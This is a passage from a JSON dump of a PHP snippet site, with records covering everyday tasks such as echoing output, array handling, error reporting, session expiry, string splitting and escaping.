    "description": "if(property_exists($car,color)){ \t//$car->color exists }\nproperty_exists( $object , \"key1\" ); // bool\n",
    "reg_date": "2021-10-12T10:18:02.000Z"
  },
  {
    "id": 3466,
    "keyword": null,
    "link": null,
    "title": " php dom add class to element",
    "description": "$dom = new DOMDocument; $dom->loadHTML($html); $divs = $dom->getElementsByTagName('div'); foreach ($divs as $div) {         $div->setAttribute('class', $div->getAttribute('class').' myclass'); } $html = $dom->saveHTML(); \n",
    "reg_date": "2021-10-12T10:18:02.000Z"
  },
  {
    "id": 3467,
    "keyword": null,
    "link": null,
    "title": " php dump",
    "description": "$variable = \"hello\";  var_dump($variable); die();\n$variable = \"Hello\";  var_dump($variable); \n$variable = \"Hello\";  var_dump($variable);\n",
    "reg_date": "2021-10-12T10:18:02.000Z"
  },
  {
    "id": 3468,
    "keyword": null,
    "link": null,
    "title": " php dynamic function call",
    "description": "//Simple $vFn = \"Login\"; $vFn();  //OR call_user_func($vFn, $vars); //Returns the return value of the callback.  //Best abstract class mBase { \tpublic function main() {     \t.....   \t} }  class mA extends mBase { \tpublic function main() {     \tparent->main();     \t.....   \t} }  class mB extends mBase {   \tpublic function main() {     \tparent->main();     \t.....   \t} } function runMM(mBase $module) {   $module->main(); } $m = 'mB'; //example runMM ($m);\npublic function view_all($building_post_id, $member_id = array());  // $this->view_all($building_post_id); \t\t// CORRECT, no need pass default params $this->view_all($building_post_id, 12);\t\t// CORRECT, pass default params      \n",
    "reg_date": "2021-10-12T10:18:03.000Z"
  },
  {
    "id": 3469,
    "keyword": null,
    "link": null,
    "title": " php echo",
    "description": "<?php   echo \"Hello World!\"; // You can also do this with a variable: $YourVariable = \"Hello World!\"; echo $YourVariable; ?>\n<?php   echo \"your text\"; ?>\n<?php  $string = \"Hello, World!\"; echo $string; ?>\nSource link: https://www.programmingquest.com/2019/04/difference-between-echo-and-print.html  1. echo Statement * we can write echo statement with parenthesis like 'echo()' or without parenthesis 'echo'. * In the echo we can pass multiple variable in comma separated form to see the output like 'echo $a,$b,$c;' * echo doesn&rsquo;t return any value * echo is faster then print  2. Print Statement * we can write print statement with parenthesis like 'print()' or without parenthesis 'print'. * In the print we can not pass multiple variable in comma separated form like echo. * print statement always returns 1. * print is slower than echo\nprint_r(\"\");\necho '';\n",
    "reg_date": "2021-10-12T10:18:03.000Z"
  },
  {
    "id": 3470,
    "keyword": null,
    "link": null,
    "title": " php echo alert js",
    "description": "echo '<script type=\"text/javascript\">alert(\"Data has been submitted to ' . $to . '\");</script>'; \njavascript:alert('Email enviado com Sucesso!'); javascript:window.location='index.php';\n",
    "reg_date": "2021-10-12T10:18:03.000Z"
  },
  {
    "id": 3471,
    "keyword": null,
    "link": null,
    "title": " php echo alot of html",
    "description": "echo <<<CODE   <table>   <tr>      <td><b>Hello World</b></td>   </tr>   </table> CODE;\n",
    "reg_date": "2021-10-12T10:18:03.000Z"
  },
  {
    "id": 3472,
    "keyword": null,
    "link": null,
    "title": " php echo an array to console",
    "description": "echo \"<script>console.log('\" . json_encode($data) . \"');</script>\";\nfunction console_log( $data ){   echo '<script>';   echo 'console.log('. json_encode( $data ) .')';   echo '</script>'; }  Usage: $myvar = array(1,2,3); console_log( $myvar ); // [1,2,3]\n",
    "reg_date": "2021-10-12T10:18:03.000Z"
  },
  {
    "id": 3473,
    "keyword": null,
    "link": null,
    "title": " php echo and array to consle",
    "description": "echo \"<script>console.log('\" . json_encode($data) . \"');</script>\"; \n",
    "reg_date": "2021-10-12T10:18:03.000Z"
  },
  {
    "id": 3474,
    "keyword": null,
    "link": null,
    "title": " php echo array",
    "description": "<?php $a = array ('a' => 'apple', 'b' => 'banana', 'c' => array ('x', 'y', 'z')); echo \"<pre>\"; print_r ($a); echo \"</pre>\"; ?>    Output:  Array (     [a] => apple     [b] => banana     [c] => Array         (             [0] => x             [1] => y             [2] => z         ) ) \nfunction echo_arr($arr){         for ($i=0; $i < count($arr); $i++) {                  echo $arr[$i];             }         }  echo_arr($your_array_here);\n<?php $a = array ('a' => 'apple', 'b' => 'banana', 'c' => array ('x', 'y', 'z')); print_r ($a); ?>\nforeach($results as $result) { \techo $result . '<br>'; }\n$a = array ('a' => 'apple', 'b' => 'banana', 'c' => array ('x', 'y', 'z')); print_r ($a);\n<?php $cars = array(\"Volvo\", \"BMW\", \"Toyota\"); echo \"I like \" . $cars[0] . \", \" . $cars[1] . \" and \" . $cars[2] . \".\"; ?>\n",
    "reg_date": "2021-10-12T10:18:03.000Z"
  },
  {
    "id": 3475,
    "keyword": null,
    "link": null,
    "title": " php echo arry",
    "description": "function echo_arr($arr){         for ($i=0; $i < count($arr); $i++) {                  echo $arr[$i];             }         }  echo_arr($your_array_here);\necho json_encode($anArray);\n$a = array ('a' => 'apple', 'b' => 'banana', 'c' => array ('x', 'y', 'z')); print_r ($a);\n",
    "reg_date": "2021-10-12T10:18:03.000Z"
  },
  {
    "id": 3476,
    "keyword": null,
    "link": null,
    "title": " php echo html and variable",
    "description": "<?php   $name = \"John Doe\";   echo \"Hey $name!\"; ?>\necho '<img src=\"' . $Variable . '\">';\necho 'Hello '.$variableName.'!';\n",
    "reg_date": "2021-10-12T10:18:03.000Z"
  },
  {
    "id": 3477,
    "keyword": null,
    "link": null,
    "title": " php echo html as text",
    "description": "echo '<pre>'; echo htmlspecialchars($YOUR_HTML); echo '</pre>'; \n",
    "reg_date": "2021-10-12T10:18:04.000Z"
  },
  {
    "id": 3478,
    "keyword": null,
    "link": null,
    "title": " php echo json",
    "description": "<?php $data = ['name' => 'John', 'age' => 35]; header('Content-type: Application/json'); echo json_encode($data); \n",
    "reg_date": "2021-10-12T10:18:04.000Z"
  },
  {
    "id": 3479,
    "keyword": null,
    "link": null,
    "title": " php echo shortcut",
    "description": " J'ai <?=$foo?> foo. \n",
    "reg_date": "2021-10-12T10:18:04.000Z"
  },
  {
    "id": 3480,
    "keyword": null,
    "link": null,
    "title": " php echo variable",
    "description": "<?php   echo \"Hello World!\"; // You can also do this with a variable: $YourVariable = \"Hello World!\"; echo $YourVariable; ?>\n<?php   $name = \"John Doe\";   echo \"Hey $name!\"; ?>\necho '<img src=\"' . $Variable . '\">';\n<?php  $string = \"Hello, World!\"; echo $string; ?>\necho 'Hello '.$variableName.'!';\n",
    "reg_date": "2021-10-12T10:18:04.000Z"
  },
  {
    "id": 3481,
    "keyword": null,
    "link": null,
    "title": " php eliminar elementos vacios array",
    "description": "// La funci&oacute;n array_filter permite eliminar los valores vac&iacute;os en un array. // Sintaxis: array array_filter ( array $input [, callback $callback ] ) // Si no se pasa el callback, elimina todos los valores iguales a FALSE.  $array = array(\"\",2,0,\"huelva\",\"\"); print_r(array_filter($array));  // Resultado: // Array ( [1] => 2 [3] => huelva )\n",
    "reg_date": "2021-10-12T10:18:04.000Z"
  },
  {
    "id": 3482,
    "keyword": null,
    "link": null,
    "title": " php ellipsis",
    "description": "$out = strlen($in) > 50 ? substr($in,0,50).\"...\" : $in;\nsubstr($str,0,50);\n",
    "reg_date": "2021-10-12T10:18:04.000Z"
  },
  {
    "id": 3483,
    "keyword": null,
    "link": null,
    "title": " php else if short syntax",
    "description": "<?php $v = 1;  $r = (1 == $v) ? 'Yes' : 'No'; // $r is set to 'Yes' $r = (3 == $v) ? 'Yes' : 'No'; // $r is set to 'No'  echo (1 == $v) ? 'Yes' : 'No'; // 'Yes' will be printed  // and since PHP 5.3 $v = 'My Value'; $r = ($v) ?: 'No Value'; // $r is set to 'My Value' because $v is evaluated to TRUE  $v = ''; echo ($v) ?: 'No Value'; // 'No Value' will be printed because $v is evaluated to FALSE ?> \n$errors = array(             0 => 'OK',             1 => 'Неверный xml',             2 => 'Широта не указана',             3 => 'Долгота не указана',             4 => 'Дата и время запроса не указаны',             5 => 'Точность не указана',             6 => 'Идентификатор телефона не указан',             7 => 'Идентификатор телефона не найден',             8 => 'Неверная широта',             9 => 'Неверная долгота',             10 => 'Неверная точность',             11 => 'Заказы не найдены',             12 => 'Неверные дата и время запроса',             13 => 'Ошибка mysql',             14 => 'Неизвестная функция',             15 => 'Тариф не найден',             18 => 'Город отправления не указан',             19 => 'Город назначения не указан',             20 => 'Неверная масса',             21 => 'Город отправления не найден',             22 => 'Город назначения не найден',             23 => 'Масса не указана',             24 => 'Логин не указан',             25 => 'Ошибка авторизации',             26 => 'Логин уже существует',             27 => 'Клиент уже существует',             28 => 'Адрес не указан',             29 => 'Более не поддерживается',             30 => 'Настройка sip не выполнена',             31 => 'Телефон не указан',             32 => 'Телефон курьера не указан',             33 => 'Ошибка соединения',             34 => 'Неверный номер',             35 => 'Неверный номер',             36 => 'Ошибка определения тарифа',             37 => 'Ошибка определения тарифа',             38 => 'Тариф не найден',             39 => 'Тариф не найден',         );          return isset($errors[$code]) ? $errors[$code] : 'Неизвестная ошибка';\n$is_admin = ($user['permissions'] == 'admin') ? true : false;\n",
    "reg_date": "2021-10-12T10:18:04.000Z"
  },
  {
    "id": 3484,
    "keyword": null,
    "link": null,
    "title": " php elseif",
    "description": "<?php if ($a > $b) {     echo \"a is bigger than b\"; } elseif ($a == $b) {     echo \"a is equal to b\"; } else {     echo \"a is smaller than b\"; } ?>\n <?php if ($a > $b) {     echo \"a is bigger than b\"; } elseif ($a == $b) {     echo \"a is equal to b\"; } else {     echo \"a is smaller than b\"; } ?>  \n$a = random_int(0, 10); $b = random_int(0, 10); if ($a > $b) {   echo 'a is greater than b'; } elseif ($a == $b) {   echo 'a is equal to b'; } else {   echo 'a is less than b'; }\n <?php if ($a > $b) {   echo \"a is greater than b\"; } else {   echo \"a is NOT greater than b\"; } ?>  \n<?php $t = date(\"H\");  if ($t < \"20\") {   echo \"Have a good day!\"; } ?>\n",
    "reg_date": "2021-10-12T10:18:04.000Z"
  },
  {
    "id": 3485,
    "keyword": null,
    "link": null,
    "title": " php empty",
    "description": "if (empty($array)) {      // list is empty. }\nif(empty($var1)){     echo 'This line is printed, because the $var1 is empty.'; }\n$x = new stdClass();\n/*  * Determine whether something is considered empty/falsy  */ empty('');      // true empty('0');     // true empty(0);       // true empty(null);    // true empty([]);      // true empty(false);   // true empty('false'); // false empty('true');  // false\nif (empty($var)) {     echo '$var is either 0, empty, or not set at all'; }\n// Declare an array and initialize it  $non_empty_array = array('apples' => '2');     // Declare an empty array  $empty_array = array();     // Condition to check array is empty or not  if(!empty($non_empty_array)) {     echo \"Given Array is not empty <br>\";  } if(empty($empty_array)) {     echo \"Given Array is empty\";  }\n",
    "reg_date": "2021-10-12T10:18:04.000Z"
  },
  {
    "id": 3486,
    "keyword": null,
    "link": null,
    "title": " php empty array",
    "description": "if (empty($array)) {      // list is empty. }\n//To clear array you are able to simply re-instantiate it $foo = array();  //To clear $foo from the symbol table use unset($foo);\n$arr = array();  if(!empty($arr)){   echo \"not empty\"; } else  {   echo \"empty\"; } \n$colors = array(\"red\",\"\",\"blue\",NULL);  $colorsNoEmptyOrNull = array_filter($colors, function($v){   return !is_null($v) && $v !== '';  }); //$colorsNoEmptyOrNull is now [\"red\",\"blue\"]\n$emptyArray = [];  $emptyArray = array(); $emptyArray = (array) null;\n$my_array = array_fill(0, $size_of_the_array, $some_data); \n",
    "reg_date": "2021-10-12T10:18:04.000Z"
  },
  {
    "id": 3487,
    "keyword": null,
    "link": null,
    "title": " php empty object",
    "description": "$x = new stdClass();\nnew stdClass()\n",
    "reg_date": "2021-10-12T10:18:04.000Z"
  },
  {
    "id": 3488,
    "keyword": null,
    "link": null,
    "title": " php enable extension ubuntu",
    "description": "### Syntax phpenmod MODULE_NAME  ### Enable mbstring php module phpenmod mbstring \n### Syntax phpenmod MODULE_NAME  ### Enable mbstring php module phpenmod mbstring\n",
    "reg_date": "2021-10-12T10:18:05.000Z"
  },
  {
    "id": 3489,
    "keyword": null,
    "link": null,
    "title": " php encode url parameters",
    "description": " urlencode(\"query string params\");\n",
    "reg_date": "2021-10-12T10:18:05.000Z"
  },
  {
    "id": 3490,
    "keyword": null,
    "link": null,
    "title": " php end if",
    "description": "<?php \tif (something): \t\techo \"something\"; \tendif; ?>\n#1 if ($var1 == true) {   // codice da eseguire } else if ($var2 == true) {   // codice da eseguire } else {   // codice da eseguire } # 2 <?php if ($var1 == true): ?>   // codice da eseguire <?php elseif ($var2 == true): ?>   // codice da eseguire <?php else: ?>   // codice da eseguire <?php endif; ?> \n",
    "reg_date": "2021-10-12T10:18:05.000Z"
  },
  {
    "id": 3491,
    "keyword": null,
    "link": null,
    "title": " php endif",
    "description": "   <?php $a = 4; if($a < 5):   echo \"Less than five\"; endif; ?> \n#1 if ($var1 == true) {   // codice da eseguire } else if ($var2 == true) {   // codice da eseguire } else {   // codice da eseguire } # 2 <?php if ($var1 == true): ?>   // codice da eseguire <?php elseif ($var2 == true): ?>   // codice da eseguire <?php else: ?>   // codice da eseguire <?php endif; ?> \n",
    "reg_date": "2021-10-12T10:18:05.000Z"
  },
  {
    "id": 3492,
    "keyword": null,
    "link": null,
    "title": " php endwhile",
    "description": "<?php /* example 1 */  $i = 1; while ($i <= 10) {     echo $i++;  /* the printed value would be                    $i before the increment                    (post-increment) */ }  /* example 2 */  $i = 1; while ($i <= 10):     echo $i;     $i++; endwhile; ?>\n",
    "reg_date": "2021-10-12T10:18:05.000Z"
  },
  {
    "id": 3493,
    "keyword": null,
    "link": null,
    "title": " php erase element from array",
    "description": "$items = ['banana', 'apple'];  unset($items[0]);  var_dump($items); // ['apple']\n//Delete array items with unset(no re-index) or array_splice(re-index)  $colors = array(\"red\",\"blue\",\"green\");                               unset($colors[1]);//remove second element, do not re-index array    $colors = array(\"red\",\"blue\",\"green\");  array_splice($colors, 1, 1); //remove second element, re-index array\n$array = [0 => \"a\", 1 => \"b\", 2 => \"c\"]; unset($array[1]); //Key which you want to delete /* $array: [     [0] => a     [2] => c ] */ //OR $array = [0 => \"a\", 1 => \"b\", 2 => \"c\"]; array_splice($array, 1, 1);//Offset which you want to delet /* $array: [     [0] => a     [1] => c ] */\nforeach ($items as $key =>$item){   if(condition){     unset($item[$key]);   } }\n",
    "reg_date": "2021-10-12T10:18:05.000Z"
  },
  {
    "id": 3494,
    "keyword": null,
    "link": null,
    "title": " php error",
    "description": "ini_set('display_errors', '1'); ini_set('display_startup_errors', '1'); error_reporting(E_ALL);\nini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); \n/* Answer to: \"php error reporting\" */  ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  /*   What do these lines of code do exactly?    The ini_set function will try to override the configuration found   in your PHP ini file.    The display_errors and display_startup_errors are just two of the   directives that are available. The display_errors directive will   determine if the errors will be displayed or hidden to the user.   Usually, the dispay_errors directive should be turned off after   development.    The display_startup_errors, however, is a separate directive   because the display_errors doesn&rsquo;t handle the errors that will be   encountered during PHP&rsquo;s startup sequence. The list of the   directives that can be overridden by the ini_set function is found   in the official documentation. */\n//PHP functions ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  //.htaccess php_flag display_startup_errors on php_flag display_errors on php_flag html_errors on php_flag log_errors on php_value error_log  /home/path/public_html/domain/PHP_errors.log\nini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); //OR ini_set('display_errors', 1); ini_set('display_startup_errors', 0); error_reporting(E_ALL & ~E_NOTICE);\n<?php error_reporting(E_ALL); ?>\n",
    "reg_date": "2021-10-12T10:18:05.000Z"
  },
  {
    "id": 3495,
    "keyword": null,
    "link": null,
    "title": " php error log",
    "description": "ini_set('display_errors', '1'); ini_set('display_startup_errors', '1'); error_reporting(E_ALL);\nini_set(\"log_errors\", 1); // Enable error logging ini_set(\"error_log\", \"/tmp/php-error.log\"); // set error path error_log( \"Hello, errors!\" ); // log a test error \n/usr/local/apache/logs/error_log\n// Php Error Log error_log(\"Error message\");  // Log and Array error_log( print_r( [   __METHOD__,   'error_key_1' => 'error_value' ] ) );\n./ShellFile.sh >& pathToLogFile.log\n// how to display php errors on your browser :  // first step, create an error function :   $errors = array();  // now you have just to insert the function like this :   if (........){   $errors['the_name_of_the_error']='the error message'; }  // example :  // we want to display an error when the user does not correctly fill,  // in the 'password' box when registering on your website :   if(empty($_POST['password']) ||    $_POST['password'] != $_POST['password_confirm']){ \t$errors['errors']= \"You must enter a valid password\"; }\n",
    "reg_date": "2021-10-12T10:18:05.000Z"
  },
  {
    "id": 3496,
    "keyword": null,
    "link": null,
    "title": " php error reporting",
    "description": "ini_set('display_errors', '1'); ini_set('display_startup_errors', '1'); error_reporting(E_ALL);\nini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); \n/* Answer to: \"php error reporting\" */  ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  /*   What do these lines of code do exactly?    The ini_set function will try to override the configuration found   in your PHP ini file.    The display_errors and display_startup_errors are just two of the   directives that are available. The display_errors directive will   determine if the errors will be displayed or hidden to the user.   Usually, the dispay_errors directive should be turned off after   development.    The display_startup_errors, however, is a separate directive   because the display_errors doesn&rsquo;t handle the errors that will be   encountered during PHP&rsquo;s startup sequence. The list of the   directives that can be overridden by the ini_set function is found   in the official documentation. */\nini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); //OR ini_set('display_errors', 1); ini_set('display_startup_errors', 0); error_reporting(E_ALL & ~E_NOTICE);\n<?php error_reporting(E_ALL); ini_set('display_errors', 'On'); \n; This directive controls whether or not and where PHP will output errors, ; notices and warnings too. Error output is very useful during development, but ; it could be very dangerous in production environments. Depending on the code ; which is triggering the error, sensitive information could potentially leak ; out of your application such as database usernames and passwords or worse. ; For production environments, we recommend logging errors rather than ; sending them to STDOUT. ; Possible Values: ;   Off = Do not display any errors ;   stderr = Display errors to STDERR (affects only CGI/CLI binaries!) ;   On or stdout = Display errors to STDOUT ; Default Value: On ; Development Value: On ; Production Value: Off ; http://php.net/display-errors display_errors = On \n",
    "reg_date": "2021-10-12T10:18:05.000Z"
  },
  {
    "id": 3497,
    "keyword": null,
    "link": null,
    "title": " php error reporting all",
    "description": "ini_set('display_errors', '1'); ini_set('display_startup_errors', '1'); error_reporting(E_ALL);\nini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); \n/* Display all errors like dev */ ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  /* Display PROD errors */ ini_set('display_errors', 1); ini_set('display_startup_errors', 0); error_reporting(E_ALL & ~E_NOTICE);  /* OTHER SETTINGS*/  // Report simple running errors error_reporting(E_ERROR | E_WARNING | E_PARSE);  // Reporting E_NOTICE  error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);  // Report all errors except E_NOTICE error_reporting(E_ALL & ~E_NOTICE); // For PHP < 5.3 error_reporting(E_ALL ^ E_NOTICE);  // Report all PHP errors error_reporting(E_ALL); //or error_reporting(-1); //or error_reporting(0);\n/* Answer to: \"php error reporting\" */  ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  /*   What do these lines of code do exactly?    The ini_set function will try to override the configuration found   in your PHP ini file.    The display_errors and display_startup_errors are just two of the   directives that are available. The display_errors directive will   determine if the errors will be displayed or hidden to the user.   Usually, the dispay_errors directive should be turned off after   development.    The display_startup_errors, however, is a separate directive   because the display_errors doesn&rsquo;t handle the errors that will be   encountered during PHP&rsquo;s startup sequence. The list of the   directives that can be overridden by the ini_set function is found   in the official documentation. */\n//PHP functions ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  //.htaccess php_flag display_startup_errors on php_flag display_errors on php_flag html_errors on php_flag log_errors on php_value error_log  /home/path/public_html/domain/PHP_errors.log\nini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); //OR ini_set('display_errors', 1); ini_set('display_startup_errors', 0); error_reporting(E_ALL & ~E_NOTICE);\n",
    "reg_date": "2021-10-12T10:18:06.000Z"
  },
  {
    "id": 3498,
    "keyword": null,
    "link": null,
    "title": " php error stack overflow",
    "description": "ini_set('display_errors', '1'); ini_set('display_startup_errors', '1'); error_reporting(E_ALL); \nerror_reporting(E_ALL); ini_set('display_errors', 1); \nini_set('display_errors', '2'); ini_set('display_startup_errors', '1'); error_reporting(E_ALL); \n",
    "reg_date": "2021-10-12T10:18:06.000Z"
  },
  {
    "id": 3499,
    "keyword": null,
    "link": null,
    "title": " php escape special characters",
    "description": "function clean($string) {    $string = str_replace(' ', '-', $string); // Replaces all spaces with hyphens.     return preg_replace('/[^A-Za-z0-9\\-]/', '', $string); // Removes special chars. }\n<?php  $string = 'foo';  if (preg_match('/[\\'^&pound;$%&*()}{@#~?><>,|=_+&not;-]/', $string)) {     // one or more of the 'special characters' found in $string } \n/*  EXAMPLE:\t<p>Bed & Breakfast</p>\t-->\t  <p>Bed &amp; Breakfast</p>       & \t&amp;     \" \t&quot; \t\t\t\t(unless ENT_NOQUOTES is set)     ' \t&#039; or &apos; \t(ENT_QUOTES must be set)     < \t&lt;     > \t&gt;\t\t\t\t*/  <?php $new = htmlspecialchars(\"<a href='test'>Test</a>\", ENT_QUOTES); echo $new; \t\t\t\t\t// <a href='test'>Test</a> ?>\n$string = \"This is testing message \"ETC\" \"; htmlspecialchars($string, ENT_COMPAT)\n",
    "reg_date": "2021-10-12T10:18:06.000Z"
  },
  {
    "id": 3500,
    "keyword": null,
    "link": null,
    "title": " php escape string",
    "description": "The real_escape_string() / mysqli_real_escape_string() function escapes special characters in a string for use in an SQL query, taking into account the current character set of the connection.  Object oriented style: $mysqli -> real_escape_string(escapestring)   $mysqli = new mysqli(\"localhost\",\"my_user\",\"my_password\",\"my_db\");  // Escape special characters, if any $firstname = $mysqli -> real_escape_string($_POST['firstname']); $lastname = $mysqli -> real_escape_string($_POST['lastname']); $age = $mysqli -> real_escape_string($_POST['age']);  Procedural style: mysqli_real_escape_string(connection, escapestring)    $con = mysqli_connect(\"localhost\",\"my_user\",\"my_password\",\"my_db\");  // Escape special characters, if any $firstname = mysqli_real_escape_string($con, $_POST['firstname']); $lastname = mysqli_real_escape_string($con, $_POST['lastname']); $age = mysqli_real_escape_string($con, $_POST['age']);\n$str = addslashes('What does \"yolo\" mean?'); echo($str);\n",
    "reg_date": "2021-10-12T10:18:06.000Z"
  },
  {
    "id": 3501,
    "keyword": null,
    "link": null,
    "title": " php eval",
    "description": "<?php   $string = \"beautiful\";   $time = \"winter\";   $str = 'This is a $string $time morning!';   echo $str. \"<br>\";   eval(\"\\$str = \\\"$str\\\";\");   echo $str; ?> // This is a $string $time morning! // This is a beautiful winter morning!\n",
    "reg_date": "2021-10-12T10:18:06.000Z"
  },
  {
    "id": 3502,
    "keyword": null,
    "link": null,
    "title": " php exception message",
    "description": "try {     throw new Exception(\"Some error message\"); } catch(Exception $e) {     echo $e->getMessage(); }\n",
    "reg_date": "2021-10-12T10:18:06.000Z"
  },
  {
    "id": 3503,
    "keyword": null,
    "link": null,
    "title": " php exec at ubuntu",
    "description": "exec('echo \"php /path/to/script.php\" | at 09:00am Jul 15')\n",
    "reg_date": "2021-10-12T10:18:06.000Z"
  },
  {
    "id": 3504,
    "keyword": null,
    "link": null,
    "title": " php executable not found visual studio code ubuntu",
    "description": "sudo apt-get install php\n",
    "reg_date": "2021-10-12T10:18:06.000Z"
  },
  {
    "id": 3505,
    "keyword": null,
    "link": null,
    "title": " php execute a background process",
    "description": "exec(sprintf(\"%s > %s 2>&1 & echo $! >> %s\", $cmd, $outputfile, $pidfile));\n",
    "reg_date": "2021-10-12T10:18:06.000Z"
  },
  {
    "id": 3506,
    "keyword": null,
    "link": null,
    "title": " php execute javascript",
    "description": "<?php  if(your condition){      echo \"<script> window.onload = function() {      yourJavascriptFunction(param1, param2);  }; </script>\"; ?> \n",
    "reg_date": "2021-10-12T10:18:07.000Z"
  },
  {
    "id": 3507,
    "keyword": null,
    "link": null,
    "title": " php exercises",
    "description": "// PHP exercises with solutions https://www.w3resource.com/php-exercises/ https://www.phpexercises.com/ https://www.etutorialspoint.com/index.php/exercise/php-exercise\n",
    "reg_date": "2021-10-12T10:18:07.000Z"
  },
  {
    "id": 3508,
    "keyword": null,
    "link": null,
    "title": " php exercises and solutions",
    "description": "// PHP exercises with solutions https://www.w3resource.com/php-exercises/ https://www.phpexercises.com/ https://www.etutorialspoint.com/index.php/exercise/php-exercise\n",
    "reg_date": "2021-10-12T10:18:07.000Z"
  },
  {
    "id": 3509,
    "keyword": null,
    "link": null,
    "title": " php exit foreach",
    "description": "$arr = array('one', 'two', 'three', 'four', 'stop', 'five'); foreach ($arr as $val) {     if ($val == 'stop') {         break;    /* You could also write 'break 1;' here. */     }     echo \"$val<br />\\n\"; }  /* Using the optional argument. */  $i = 0; while (++$i) {     switch ($i) {         case 5:             echo \"At 5<br />\\n\";             break 1;  /* Exit only the switch. */         case 10:             echo \"At 10; quitting<br />\\n\";             break 2;  /* Exit the switch and the while. */         default:             break;     } } ?>  \n",
    "reg_date": "2021-10-12T10:18:07.000Z"
  },
  {
    "id": 3510,
    "keyword": null,
    "link": null,
    "title": " php exit from loop",
    "description": "break(); \n",
    "reg_date": "2021-10-12T10:18:07.000Z"
  },
  {
    "id": 3511,
    "keyword": null,
    "link": null,
    "title": " php expire a session",
    "description": "//Ending a php session after 30 minutes of inactivity  $minutesBeforeSessionExpire=30;  if (isset($_SESSION['LAST_ACTIVITY']) && (time() - $_SESSION['LAST_ACTIVITY'] > ($minutesBeforeSessionExpire*60))) {      session_unset();     // unset $_SESSION         session_destroy();   // destroy session data    }  $_SESSION['LAST_ACTIVITY'] = time(); // update last activity\n",
    "reg_date": "2021-10-12T10:18:07.000Z"
  },
  {
    "id": 3512,
    "keyword": null,
    "link": null,
    "title": " php expire session",
    "description": "//Ending a php session after 30 minutes of inactivity  $minutesBeforeSessionExpire=30;  if (isset($_SESSION['LAST_ACTIVITY']) && (time() - $_SESSION['LAST_ACTIVITY'] > ($minutesBeforeSessionExpire*60))) {      session_unset();     // unset $_SESSION         session_destroy();   // destroy session data    }  $_SESSION['LAST_ACTIVITY'] = time(); // update last activity\n",
    "reg_date": "2021-10-12T10:18:07.000Z"
  },
  {
    "id": 3513,
    "keyword": null,
    "link": null,
    "title": " php explode",
    "description": "<?php // It doesnt get any better than this Example $pizza  = \"piece1 piece2 piece3 piece4 piece5 piece6\"; $pieces = explode(\" \", $pizza); echo $pieces[0]; // piece1 echo $pieces[1]; // piece2\n$colors  = \"red,blue,green,orange\"; $colorsArray = explode(\",\", $colors);\n$url = explode(\"/\", URL::current()); echo end($url);\n <?php // Example 1 $pizza  = \"piece1 piece2 piece3 piece4 piece5 piece6\"; $pieces = explode(\" \", $pizza); echo $pieces[0]; // piece1 echo $pieces[1]; // piece2  // Example 2 $data = \"foo:*:1023:1000::/home/foo:/bin/sh\"; list($user, $pass, $uid, $gid, $gecos, $home, $shell) = explode(\":\", $data); echo $user; // foo echo $pass; // *  ?>  \n$list = \"one,two,three\"; $sep_char = \",\"; // array of all needed items: \"one\", \"two\", \"three\" $arr = explode($sep_char, $list); // array of max two items: \"one\", \"two,three\" $arr = explode($sep_char, $list, 2);\n<?php  // php explode function => converting text into array  $str = \"Hello world. It's a beautiful day.\"; print_r (explode(\" \",$str)); // here we define space for breaking we can change space with particular, commna or etc // results ['hello','world.','It's','a','beautiful','day.']  ?> \n",
    "reg_date": "2021-10-12T10:18:07.000Z"
  },
  {
    "id": 3514,
    "keyword": null,
    "link": null,
    "title": " php explode end",
    "description": "$url = explode(\"/\", URL::current()); echo end($url);\n$nums = \"\"; //Declare a variable with empty set.  $nums .= $number; //concatenate the empty string with the integer $number You can also use  $nums = $nums.$number; // this and the expression above do the same thing choose whichever you                      //like.. This concatenation automatically converts integer to string $nums[0] is now 4, $nums[1] is now 5, etc.. $length = strlen($nums); // This is the length of your integer. $target = strlen($nums) -1; // target the last digit in the string;     $last_digit = $nums[$target]; // This is the value of 5. Last digit in the (now string)\n",
    "reg_date": "2021-10-12T10:18:07.000Z"
  },
  {
    "id": 3515,
    "keyword": null,
    "link": null,
    "title": " php explode multiple delimiters",
    "description": "$output = preg_split('/(@|,|;)/', $input);\n",
    "reg_date": "2021-10-12T10:18:08.000Z"
  },
  {
    "id": 3516,
    "keyword": null,
    "link": null,
    "title": " php explode new line",
    "description": "$values = preg_split('/\\r\\n|\\r|\\n/', $myString);\n",
    "reg_date": "2021-10-12T10:18:08.000Z"
  },
  {
    "id": 3517,
    "keyword": null,
    "link": null,
    "title": " php explode trim",
    "description": "$new_arr = array_map('trim', explode(',', $str));\n",
    "reg_date": "2021-10-12T10:18:08.000Z"
  },
  {
    "id": 3518,
    "keyword": null,
    "link": null,
    "title": " php extend parent constructor",
    "description": "parent::__construct();\n",
    "reg_date": "2021-10-12T10:18:08.000Z"
  },
  {
    "id": 3519,
    "keyword": null,
    "link": null,
    "title": " php extensions for laravel",
    "description": "sudo apt install openssl php-common php-curl php-json php-mbstring php-mysql php-xml php-zip\n",
    "reg_date": "2021-10-12T10:18:08.000Z"
  },
  {
    "id": 3520,
    "keyword": null,
    "link": null,
    "title": " php extract array",
    "description": "extract($array);\n <?php $array = array(\"size\" => \"XL\", \"color\" => \"gold\"); print_r(array_values($array)); ?>  \n",
    "reg_date": "2021-10-12T10:18:08.000Z"
  },
  {
    "id": 3521,
    "keyword": null,
    "link": null,
    "title": " php extract last n words of string",
